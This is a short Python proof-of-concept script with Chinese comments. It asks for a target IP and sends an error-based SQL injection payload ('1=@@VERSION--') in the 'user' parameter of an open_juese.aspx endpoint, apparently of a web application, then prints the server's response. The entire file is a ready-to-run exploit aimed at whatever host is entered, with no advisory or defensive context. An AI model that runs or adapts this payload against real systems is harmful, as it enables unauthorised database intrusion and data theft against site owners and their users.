import requests


def send_request(host):
    # 构造请求的 URL
    url = f"http://{host}/OpenWindows/open_juese.aspx?key=1&name=1&user=-1)+and+1=@@VERSION--+&requeststr="

    # 设置请求头
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
        'Accept': '*/*',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'zh-CN,zh;q=0.9',
        'Connection': 'close',
    }

    try:
        # 发送 GET 请求
        response = requests.get(url, headers=headers)

        # 打印响应状态码和内容
        print(f"状态码: {response.status_code}")
        print("响应体:")
        print(response.text)

    except requests.exceptions.RequestException as e:
        print(f"An error occurred: {e}")


if __name__ == '__main__':
    # 输入目标主机
    target_host = input("输入目标ip: ")
    send_request(target_host)
